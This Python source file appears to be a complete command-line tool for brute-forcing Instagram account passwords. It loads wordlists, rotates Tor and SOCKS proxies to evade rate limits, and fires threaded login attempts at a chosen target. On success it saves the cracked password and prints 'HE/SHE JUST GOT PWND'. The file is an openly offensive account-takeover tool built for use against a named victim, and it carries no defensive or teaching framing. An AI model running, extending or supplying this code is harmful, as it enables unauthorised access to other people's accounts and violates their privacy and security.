#!/usr/bin/python3
import builtins
import json

from prompt_toolkit import HTML, PromptSession, print_formatted_text as print
from prompt_toolkit.application import get_app
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.clipboard.pyperclip import PyperclipClipboard
from prompt_toolkit.completion import NestedCompleter, PathCompleter
from prompt_toolkit.contrib.regular_languages.lexer import GrammarLexer
from prompt_toolkit.formatted_text import fragment_list_width, to_formatted_text, merge_formatted_text
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.lexers import SimpleLexer
from prompt_toolkit.shortcuts import set_title, yes_no_dialog, input_dialog, confirm
from prompt_toolkit.styles import Style
from prompt_toolkit.contrib.regular_languages.compiler import compile
import datetime
import random
import re
import threading
import time
import requests
import os
from playsound import playsound
from rich.console import Console
from Login import Login
from Printf import printf
from Proxy import proxy
from Randomize import randomize
from Timer import timer
from Validator import validator
from table import table
from vars import style
from Help import __help__


class InstaGram:
    def __init__(self):
        self.tool_name = "InstaGram"
        self.target = ""
        self.done_passwords = 0
        self.total_passwords = 0
        self.progress = "0.00%"
        self.session = requests.session()
        self.current_password = "-"
        self.passwords = []
        self.retry_passwords = []
        self.wls = {}  # wls=wordlists
        self.wordlists_analyzed = False
        self.execution_history = []
        self.log_history = True
        self.proxies = {}
        self.proxy_controlPort = 9051
        self.protocols = ["socks5", "socks", "http", "https", "ftp", "ssh"]
        self.proxy_options = {"ControlPort": self.proxy_controlPort}
        self.options = {"sound": "alarm-siren.wav", "delay": 3, "timeout": 15,
                        "rest": 5}  # , "threads": 3, "log": True}
        path_completer = PathCompleter(expanduser=True)

        self.completer = {
            # "": {},
            # "": {},
            "target": None,
            "wordlist": {
                "list": None,
                "count": self.wls,
                "analyze": self.wls,
                "add": path_completer,
                "remove": self.wls
            },
            # proxy add socks5:127.0.0.1:5000 w3b9086w30698hy3wht
            "proxy": {
                # pattern:
                # socks5:127.0.0.1:5000 <Password>
                "list": None,
                "import": path_completer,
                "identity": {"new": self.proxies, "check": self.proxies},
                "control_port": None,
                "options": None,
                "protocols": None,
                "add": None,
                "remove": self.proxies,
            },
            "options": {
                "show": None,
                "set": {
                    # "threads": None, # 3
                    "rest": None,  # 5 (rest per minutes when over requesting)
                    "sound": path_completer,  # alarm-siren.wav (will be played if password found!!)
                    "delay": None,  # 3
                    "timeout": None,  # 15
                }
            },
            "bruteforce": {
                "run": None
            },
            "set": {
                "title": None,
            },
            "password": {
                "list": None,  # show all
                "count": None,  # show number
                "query": None,  # check if password is in list
                "place": {},  # get place of password in passwords list
                "sort": {"ascending": None, "descending": None, "shuffle": None},
                "add": None,  # add manually
                "retry": None,  # non-tried passwords
                "remove": {},  # remove manually
                "clear": None  # clear all passwords list
            },
            "status": None,
            "history": {"clear": None, "save": None},
            "help": None,
            "clear": None,
            "exit": None
        }
        self.title = self.tool_name

    def Go(self):
        set_title(self.title)
        history = InMemoryHistory()
        bindings = KeyBindings()

        def Lexer():
            def command_validation():
                return compile(
                    f"\s*((?P<arg1>({'|'.join(list(InstaGram().completer.keys()))})) \s+ (?P<arg2>(\S+)) \s+ (?P<arg3>(\S+)))\s*"
                )

            CV = command_validation()  # CV: Command Validation
            return GrammarLexer(
                CV,
                lexers={
                    "arg1": SimpleLexer("class:arg1"),
                    "arg2": SimpleLexer("class:arg2"),
                    "arg3": SimpleLexer("class:arg3"),
                    "query-username": SimpleLexer("class:query-username"),
                }
            )

        @bindings.add(" ")
        def _(event):
            b = event.app.current_buffer
            w = b.document.get_word_before_cursor()

            if w is not None:
                if w in self.Corrections():
                    b.delete_before_cursor(count=len(w))
                    b.insert_text(self.Corrections()[w])

            b.insert_text(" ")

        while True:
            try:
                self.completer_obj = NestedCompleter.from_nested_dict(self.completer, )
                psession = PromptSession(style=style,
                                         enable_system_prompt=True, enable_history_search=True, enable_suspend=True,
                                         search_ignore_case=True, complete_in_thread=True, complete_while_typing=True,
                                         completer=self.completer_obj, wrap_lines=False, multiline=False,
                                         clipboard=PyperclipClipboard(), vi_mode=False, refresh_interval=0.999,
                                         history=history, auto_suggest=AutoSuggestFromHistory(), key_bindings=bindings,
                                         mouse_support=False, bottom_toolbar=self.Bottom_Toolbar,
                                         include_default_pygments_style=True,
                                         lexer=Lexer())
                insta_reg = re.findall('\S+', psession.prompt(
                    HTML(f"<b fg='red'>{self.tool_name}</b><a fg='#00ff1b'>~$</a> ")))
                if self.log_history: self.execution_history.append([' '.join(insta_reg)])
                insta = ' '.join(insta_reg)

                if insta.startswith("@") and len(insta[1:]) > 0:
                    username = insta[1:]
                    try:
                        data = requests.get(url=f"https://www.instagram.com/{username}/?__a=1&__d=dis").json()
                        Console().print(str(json.dumps(data, indent=4)), highlight=True)
                    except Exception as error:
                        print(error)
                elif insta_reg[0] == "target":
                    if len(insta_reg) > 1:
                        target = insta_reg[1]
                        self.target = target
                        printf("Success: target set to '%s'." % target, mt="success")
                    else:
                        if self.target:
                            printf(self.target, mt="msg")
                        else:
                            printf("Warning: set target first.", mt="warn")
                elif insta_reg[0] == "set":
                    if insta_reg[1] == "title":
                        if len(insta_reg) > 2:
                            set_title(insta_reg[2])
                        else:
                            set_title(self.tool_name)
                elif insta_reg[0] == "exit":
                    exit()
                elif insta_reg[0] == "clear":
                    self.ClearScreen()
                elif insta_reg[0] == "history":
                    if len(insta_reg) > 1:
                        if insta_reg[1] == "clear":
                            self.execution_history.clear()
                        elif insta_reg[1] == "save":
                            if len(self.execution_history) > 0:
                                filename = str(random.randint(1000000000, 9999999999)) + ".txt"
                                if len(insta_reg) > 2:
                                    filename = insta_reg[2]
                                with open(filename, "w") as h:
                                    h.write(table.Make(self.execution_history, headers=["#", "command"]))
                                h.close()
                                printf("Success: Saved history to '%s'" % filename, mt="success")
                            else:
                                printf("Error: There is no data in the history to save.", mt="error")
                    else:
                        table.print(self.execution_history, headers=["#", "command"])
                elif insta_reg[0] == "wordlist":
                    if insta_reg[1] == "add":
                        wordlist = insta_reg[2]
                        if wordlist not in self.wls:
                            if os.path.exists(wordlist):
                                if os.path.isfile(wordlist):
                                    try:
                                        with open(wordlist, "r", errors="ignore") as aw:  # aw=analyze wordlist
                                            l = len(aw.readlines())
                                        self.wls[wordlist] = None  # must be None to avoid Assertion error
                                        printf("Success: '%s' added to wordlists list." % os.path.split(wordlist)[-1],
                                               mt="success")
                                        printf("Info: '%s' = %sl" % (os.path.split(wordlist)[-1], l), mt="info")
                                        aw.close()
                                        self.wordlists_analyzed = False
                                    except Exception:
                                        printf("Error: '%s' couldn't be processed to pre-analyze." % wordlist,
                                               mt="error")
                                elif os.path.isdir(wordlist):
                                    if os.path.exists(wordlist):
                                        wordlists_inDir = os.listdir(wordlist)
                                        if len(wordlists_inDir) > 0:
                                            for wl in wordlists_inDir:
                                                fullpath = os.path.join(wordlist, wl)
                                                if fullpath not in self.wls:
                                                    if os.path.isfile(fullpath) and os.path.exists(fullpath):
                                                        try:
                                                            with open(fullpath, "r",
                                                                      errors="ignore") as aw:  # aw=analyze wordlist
                                                                l = len(aw.readlines())
                                                            self.wls[fullpath] = None
                                                            printf("Success: '%s' added to wordlists list." %
                                                                   os.path.split(fullpath)[-1], mt="success")
                                                            printf(
                                                                "Info: '%s' = %sl" % (os.path.split(fullpath)[-1], l),
                                                                mt="info")
                                                            aw.close()
                                                            self.wordlists_analyzed = False
                                                        except Exception:
                                                            printf(
                                                                "Error: '%s' couldn't be processed to pre-analyze." % wl,
                                                                mt="error")
                                                else:
                                                    printf(
                                                        "Warning: '%s' already added" % (os.path.split(fullpath)[-1]),
                                                        mt="warn")
                                    else:
                                        printf("Error: '%s' is not exist." % wordlist, mt="error")
                                else:
                                    printf("Error: '%s' is not a file or directory." % wordlist, mt="error")
                            else:
                                printf("Error: '%s' not exist." % wordlist, mt="error")
                        else:
                            printf("Warning: '%s' already added." % wordlist, mt="warn")
                    elif insta_reg[1] == "remove":
                        wordlist = insta_reg[2]
                        if wordlist in self.wls:
                            self.wls.pop(wordlist)
                            printf("Success: '%s' removed from wordlists list." % wordlist, mt="success")
                        else:
                            printf("Error: '%s' not in the list." % wordlist, mt="error")
                    elif insta_reg[1] == "list":
                        for w in self.wls:
                            printf(w, mt="msg")
                    elif insta_reg[1] == "count":
                        if insta_reg[2] in self.wls:
                            try:
                                with open(insta_reg[2], "r", errors="ignore") as count_wordlist:
                                    l = count_wordlist.readlines()
                                print(len(l))
                                count_wordlist.close()
                            except Exception as error:
                                printf("Error: couldn't get '%s' length" % insta_reg[2], mt="error")
                                printf("Reason: '%s'" % error)
                        else:
                            printf("Error: '%s' not in wordlists list" % insta_reg[2], mt="error")
                    elif insta_reg[1] == 'analyze':
                        if len(self.wls) > 0:
                            if insta_reg[2:]:
                                for file in insta_reg[2:]:
                                    if file in self.wls:
                                        self.Analyze(file=file)
                                        self.wordlists_analyzed = True
                                    else:
                                        printf("Error: '%s' not in wordlists list." % file, mt="error")
                            else:
                                for wl in self.wls:
                                    self.Analyze(file=wl)
                                    self.wordlists_analyzed = True
                            # print() # to avoid line print overflow (missing the line)
                        else:
                            printf('Warning: No wordlists added to analyze.', mt="warn")
                        # self.UpdateAfterAnalyze()
                elif insta_reg[0] == "password":
                    if insta_reg[1] == "list":
                        if self.passwords:
                            for p in self.passwords:
                                printf(p, mt="msg")
                    elif insta_reg[1] == "count":
                        print(len(self.passwords), )
                    elif insta_reg[1] == "query":
                        print(insta_reg[2] in self.passwords)
                    elif insta_reg[1] == "place":
                        if insta_reg[2] in self.passwords:
                            print(self.passwords.index(insta_reg[2]) + 1)
                    elif insta_reg[1] == "sort":
                        if insta_reg[2] == "ascending":  # a,b,c,d,e ...
                            self.passwords = sorted(self.passwords)
                            self.UpdateAfterAnalyze()
                        elif insta_reg[2] == "descending":  # z,y,x,w,v ...
                            self.passwords = sorted(self.passwords)[::-1]
                            self.UpdateAfterAnalyze()
                        elif insta_reg[2] == "shuffle":  # every time new ordering
                            random.shuffle(self.passwords)
                            self.UpdateAfterAnalyze()
                    elif insta_reg[1] == "add":
                        if insta_reg[2] not in self.passwords:
                            if len(insta_reg[2]) >= 6:
                                self.passwords.append(insta_reg[2])
                            else:
                                printf("Error: the password should be six chars long not '%s'" % len(insta_reg[2]),
                                       mt="error")
                        else:
                            printf("Warning: '%s' already in passwords list." % insta_reg[2], mt="warn")
                    elif insta_reg[1] == "clear":
                        self.passwords.clear()
                    elif insta_reg[1] == "retry":
                        if len(self.retry_passwords) > 0:
                            print("\n".join(self.retry_passwords))
                        else:
                            printf("Error: there are not passwords in the passwords retry list", mt="error")
                    elif insta_reg[1] == "remove":
                        if insta_reg[2] in self.passwords:
                            self.passwords.remove(insta_reg[2])
                        else:
                            printf("Error: '%s' is not in passwords list." % insta_reg[2], mt="error")
                    # self.target = self.Input(completer=self.completer_obj, message="Who is the victim?:")
                elif insta_reg[0] == "proxy":
                    if insta_reg[1] == "list":
                        table.print(
                            data=[[i] + list(self.proxies[i].values()) for i in [p for p in self.proxies.keys()]],
                            headers=["#", "id", "protocol", "ip", "port", "password"])
                    elif insta_reg[1] == "identity":
                        if insta_reg[2] == "new":
                            id = insta_reg[3]
                            if id in self.proxies:
                                proxy.new(id=id, proxy_data=self.proxies[id], controlPort=self.proxy_controlPort)
                            else:
                                printf("Error: '%s' is not a valid proxy id." % id, mt="error")
                        elif insta_reg[2] == "check":
                            id = insta_reg[3]
                            if id in self.proxies:
                                proxy.get_identity(id=id, proxy_data=self.proxies[id])
                            else:
                                printf("Error: '%s' is not a valid proxy id." % id, mt="error")
                    elif insta_reg[1] == "control_port":
                        if validator.port(insta_reg[2]):
                            self.proxy_controlPort = insta_reg[2]
                            printf("success: tor ControlPort set to '%s'" % insta_reg[2], mt="success")
                        else:
                            printf("Error: '%s' is not a valid port (valid: 0-65535)." % insta_reg[2], mt="error")
                    elif insta_reg[1] == "protocols":
                        for i, p in enumerate(sorted(self.protocols), start=1):
                            printf(f"{i}: {p}", mt="msg")
                    elif insta_reg[1] == "options":
                        print(json.dumps(self.proxy_options, indent=4))
                    elif insta_reg[1] == "import":
                        file = insta_reg[2]
                        if os.path.exists(file):
                            if os.path.isfile(file):
                                try:
                                    with open(file, "r") as import_file:
                                        proxies = import_file.readlines()
                                        for p in proxies:
                                            self.AddProxy(re.findall('\S+', p))
                                except Exception as error:
                                    printf("Error: error occurred while importing '%s'" % file, mt="error")
                                    printf("Reason: '%s'" % error, mt="msg")
                    elif insta_reg[1] == "add":
                        self.AddProxy(input=insta_reg[2:])
                    elif insta_reg[1] == "remove":
                        id = insta_reg[2]
                        if id in self.proxies.keys():
                            self.proxies.pop(id)
                            printf("Success: proxy with id '%s' removed." % id, mt="success")
                        else:
                            printf("Error: no proxy with id '%s'." % id, mt="error")

                elif insta_reg[0] == "options":
                    if insta_reg[1] == "show":
                        print(self.options)
                    elif insta_reg[1] == "set":
                        if len(insta_reg) > 3:
                            if insta_reg[2] in self.options:
                                option = insta_reg[2]
                                value = insta_reg[3]
                                if option in list(self.completer["options"]["set"].keys()):
                                    try:
                                        if isinstance(int(value), type(self.options[option])) and int(value) >= 1:
                                            self.options[option] = int(value)
                                            printf("Success: '%s' updated to '%s'." % (option, int(value)),
                                                   mt="success")
                                            printf("Info: '%s' now is '%s'." % (option, self.options[option]),
                                                   mt="info")
                                        else:
                                            printf("Error: '%s' is not value for '%s'." % (value, option), mt="error")
                                    except Exception:
                                        printf("Error: '%s' is not value for '%s'." % (value, option), mt="error")
                            else:
                                printf("Error: '%s' is not an options." % insta_reg[2], mt="error")
                        else:
                            printf("Error: '%s' value can't be empty" % insta_reg[2], mt="error")
                elif insta_reg[0] == "status":
                    data = {"is_analyzed": self.wordlists_analyzed}  # , "attempts": self.done_passwords}
                    print(data)
                elif insta_reg[0] == "options":
                    data = {"target": self.target, "wordlists": list(self.wls.keys())}
                    print(data)
                elif insta_reg[0] == "help":
                    print(__help__)

                elif insta_reg[0] == "bruteforce":
                    if insta_reg[1] == "run":
                        if self.target:
                            are_you_sure = confirm("Let's rick and roll?!", suffix=" [y/n]: ")
                            if are_you_sure:
                                self.BruteForce()
                        else:
                            printf("Error: target not set", mt="error")
            except (KeyboardInterrupt, IndexError):
                pass

            self.total_passwords = len(self.passwords)
            self.UpdateAfterAnalyze()
            self.UpdateAfterAddingWordlist()
            self.UpdateAfterAddingProxy()
            # self.BruteForce()

    def UpdateAfterAddingWordlist(self):
        self.completer['wordlist']['count'] = self.wls
        self.completer['wordlist']['analyze'] = self.wls
        self.completer['wordlist']['remove'] = self.wls

    def UpdateAfterAnalyze(self):
        self.completer['password']['place'] = {}.fromkeys(self.passwords, None)
        self.completer['password']['remove'] = {}.fromkeys(self.passwords, None)

    def UpdateAfterAddingProxy(self):
        self.completer['proxy']['identity']['new'] = {}.fromkeys(self.proxies, None)
        self.completer['proxy']['identity']['check'] = {}.fromkeys(self.proxies, None)
        self.completer['proxy']['remove'] = {}.fromkeys(self.proxies, None)

    def AddProxy(self, input: list):
        protocol = input[0].split(":")[0]
        ip = input[0].split(":")[1]
        port = input[0].split(":")[2]
        password = input[1]
        proxy_creds = {"protocol": protocol, "ip": ip, "port": port, "password": password}
        if not proxy_creds in list(self.proxies.values()):
            if validator.protocol(protocol):
                if validator.ip(ip):
                    if validator.port(port):
                        id = randomize.id()
                        self.proxies[id] = proxy_creds
                        printf("Success: Proxy added with id '%s'" % id, mt="success")
                    else:
                        printf("Error: '%s' is not a valid port (valid: 0-65535)." % port, mt="error")
                else:
                    printf("Error: '%s' is not a valid ip address." % ip, mt="error")
            else:
                printf(
                    "Error: '%s' is not a valid protocol, valid protocols: %s" % (protocol, ",".join(self.protocols)),
                    mt="error")
                printf("Info: Valid pattern (<protocol>:<ip>:<port>).", mt="info")
        else:
            printf("Warning: '%s:%s' is already added." % (ip, port), mt="warn")

    def Analyze(self, file):
        lt6 = 0  # lt6=less than 6 (the shortest possible instagram password)
        unique = 0
        duplicates = 0
        analyze_timer = timer
        analyze_timer.start()  # not important but to avoid wrong estimated time.

        try:
            with open(file, "r", errors="ignore") as w:
                passwords = w.readlines()
                total = len(passwords)
                for p in passwords:  # p=password
                    p = p.strip().replace(" ", "")
                    if p not in self.passwords:
                        if len(p) >= 6:
                            unique += 1
                            self.passwords.append(p)
                        else:
                            lt6 += 1
                    else:
                        duplicates += 1
                    done = (unique + duplicates + lt6)
                    builtins.print(
                        f"\r[{list(self.wls.keys()).index(file) + 1}/{len(self.wls)}] - [{os.path.split(file)[-1]}] - {done}/{total} - {self.percentage(all=total, part=done)} - short: {lt6} - unique: {unique} - duplicates: {duplicates} - {analyze_timer.get()}",
                        end='')
                    w.close()
                print()
        except Exception:
            printf("Error: '%s' couldn't be analyzed." % os.path.split(file)[-1], mt="error")
        printf("Success: done analyzing '%s'" % file, mt="success")

    def ClearScreen(self):
        try:
            os.system("clear")
        except Exception:
            os.system("cls")

    def YesNo(self, message: str, title: str = "InstaGram", yes: str = "Yes", no: str = "No"):
        style = Style.from_dict({
            'dialog': 'bg:#88ff88',
            'dialog frame.label': 'bg:#ffffff #000000',
            'dialog.body': 'bg:#000000 #00ff00',
            'dialog shadow': 'bg:#00aa00',
        })
        dialog = yes_no_dialog(yes_text=yes, no_text=no, text=message, title=title).run(in_thread=True)
        return dialog

    def Input(self, message: str, title: str = "InstaGram",
              completer: NestedCompleter = NestedCompleter.from_nested_dict({}), cancel_text: str = "Cancel",
              ok_text: str = "OK", password: bool = False, default: str = ""):
        style = Style.from_dict({
            'dialog': 'bg:#88ff88',
            'dialog frame.label': 'bg:#ffffff #000000',
            'dialog.body': 'bg:#000000 #00ff00',
            'dialog shadow': 'bg:#00aa00',
        })
        return input_dialog(title=title, text=message, completer=completer, cancel_text=cancel_text, ok_text=ok_text,
                            password=password, default=default).run()

    def percentage(self, part: int, all: int) -> str:
        return "{:.2f}%".format((part * 100 / all))

    def Corrections(self):
        return {
            # 10
            "targ": "target",
            "targe": "target",
            "targte": "target",
            "targtt": "target",
            "targee": "target",
            "targr": "target",
            "targrt": "target",
            "targe6": "target",
            "taret": "target",
            "taget": "target",

            # 24
            "histoy": "history",
            "hitory": "history",
            "histoyy": "history",
            "histryy": "history",
            "hisrry": "history",
            "hostry": "history",
            "histor": "history",
            "histry": "history",
            "histoyr": "history",
            "hisotr": "history",
            "jistory": "history",
            "gistory": "history",
            "hostory": "history",
            "hustory": "history",
            "hidtory": "history",
            "hiatory": "history",
            "hisyory": "history",
            "hisrory": "history",
            "histpry": "history",
            "histiry": "history",
            "histoty": "history",
            "histoey": "history",
            "historu": "history",
            "histort": "history",

            # 11
            "sho": "show",
            "shw": "show",
            "shlw": "show",
            "dhow": "show",
            "ahow": "show",
            "sjow": "show",
            "sgow": "show",
            "shpw": "show",
            "shiw": "show",
            "shoe": "show",
            "shoq": "show",

            # 13
            "clea": "clear",
            "claer": "clear",
            "cler": "clear",
            "vlear": "clear",
            "xlear": "clear",
            "c;ear": "clear",
            "ckear": "clear",
            "clrar": "clear",
            "clwar": "clear",
            "cledr": "clear",
            "clesr": "clear",
            "cleat": "clear",
            "cleae": "clear",

        }

    def Bottom_Toolbar(self):
        # analyzed = f"<true>{self.wordlists_analyzed}</true>" if self.wordlists_analyzed == True else f"<false>{self.wordlists_analyzed}</false>"
        left_part = HTML(
            "<left-part>"
            f" <tool> {self.tool_name} </tool> <sep>|</sep>"
            f" <label>Target:</label> <target>{self.target}</target> <sep>|</sep>"
            f" <label>Passwords:</label> <all-passwords>{len(self.passwords)}</all-passwords> <sep>|</sep>"
            f" <label>Attempts:</label> <all-passwords>{self.done_passwords}</all-passwords> <sep>|</sep>"
            f" <label>Progress:</label> <percentage>{self.progress}</percentage> <sep>|</sep>"
            f" <label>Proxy:</label> <all-passwords>{len(self.proxies)}</all-passwords> <sep>|</sep>"
            "</left-part>"
        )
        right_part = HTML(
            "<right-part> "
            " <time> %s </time> "
            "</right-part>"
        ) % (datetime.datetime.now().strftime("%Y/%m/%d %I:%M:%S"),)

        used_width = sum(
            [
                fragment_list_width(to_formatted_text(left_part)),
                fragment_list_width(to_formatted_text(right_part)),
            ]
        )

        total_width = get_app().output.get_size().columns
        padding_size = total_width - used_width

        padding = HTML("<padding>%s</padding>") % (" " * padding_size)

        return merge_formatted_text([left_part, padding, right_part])

    def BruteForce(self):
        proxies = self.proxies.copy()
        target = self.target
        passwords = self.passwords.copy()
        password_len = len(passwords)
        if len(proxies) > 0:
            if len(self.passwords) >= len(proxies):
                self.retry_passwords.clear()
                ignore_proxies = []
                self.done_passwords = 0

                printf("Info: loaded %s proxies" % (len(proxies)), mt="info")
                for pro in proxies:
                    printf("Check: checking '%s' => [%s:%s] .." % (pro, proxies[pro]['ip'], proxies[pro]['port']),
                           mt="msg")
                    if proxy.is_online(proxy_data=proxies[pro]):
                        printf("Info: '%s' => [%s:%s] is running" % (pro, proxies[pro]['ip'], proxies[pro]['port']),
                               mt="info")
                    else:
                        printf(
                            "Error: '%s' => [%s:%s] is not running" % (pro, proxies[pro]['ip'], proxies[pro]['port']),
                            mt="error")
                        ignore_proxies.append(pro)

                for p in ignore_proxies:
                    self.proxies.pop(p)

                for pid in proxies:  # itterate through proxy ids
                    def Thread_Proxy():
                        while len(passwords) > 0:
                            password = passwords[0]
                            if password in passwords:
                                try:
                                    passwords.remove(password)
                                    t = str(datetime.datetime.now().strftime("%Y/%m/%d %I:%M:%S %p"))
                                    printf(f"Trying: [{t}] - {target} => {password}")
                                    self.done_passwords += 1
                                    login_attempt = Login(target=target, id=pid, proxy_data=proxies[pid],
                                                          password=password, controlPort=self.proxy_controlPort,
                                                          timeout=self.options['timeout'],
                                                          retry_passwords=self.retry_passwords,
                                                          rest=self.options['rest']).Try()
                                    self.progress = self.percentage(all=password_len, part=self.done_passwords)
                                    if login_attempt:
                                        if self.options["sound"]:
                                            try:
                                                playsound(self.options["sound"])
                                            except Exception:
                                                pass
                                        with open(f"{target}.password", "a") as target_password_found:
                                            target_password_found.write(f"{target} => '{password}'\n")
                                        target_password_found.close()
                                        exit("*** HE/SHE JUST GOT PWND ***")
                                    elif login_attempt == False:
                                        t = str(datetime.datetime.now().strftime("%Y/%m/%d %I:%M:%S %p"))
                                        printf(f"Wrong: [{t}] - {self.target} => '{password}'", mt="error")
                                    # else:
                                    #     t = str(datetime.datetime.now().strftime("%Y/%m/%d %I:%M:%S %p"))
                                    #     printf(f"Warning: [{t}] - {self.target} => '{password}' (Too much requests)", mt="warn")
                                    #     if password in self.passwords:
                                    #         self.passwords.remove(password)
                                    #         printf("Error: '%s' removed from passwords." % (password), mt="error")
                                    time.sleep(self.options['delay'])
                                except ValueError:
                                    continue
                        else:
                            printf(f"*** ['{pid}'] ALL PASSWORDS EITHER IN PROGRESS OR DONE ***", mt="info")

                    threading.Thread(target=Thread_Proxy).start()
                    time.sleep(1)  # to avoid proxies process mixing

                # if len(retry_passwords) > 0:
                #     printf("Warning: there is '%s' passwords that couldn't be tried" % len(retry_passwords), mt="warn")
                #     random = target + "_" + randomize.id(length=10) + ".retry"
                #     printf("Info: all the '%s' passwords will be writen to '%s'" % (len(retry_passwords), random), mt="info")
                #     with open(random, "w") as retry_file:
                #         retry_file.write("\n".join(retry_passwords))
                #     retry_file.close()
                #     printf("Info: all the '%s' passwords saved to '%s' successfully (RETRY IT AGAIN)" % (len(retry_passwords), random), mt="info")
                # else:
                #     printf("Info: there is no passwords in the retry passwords list", mt="info")
            else:
                printf("Error: passwords is the big deal, add some passwords", mt="error")
        else:
            printf("Error: you can't go without proxies", mt="error")


if __name__ == "__main__":
    ig = InstaGram()
    ig.Go()
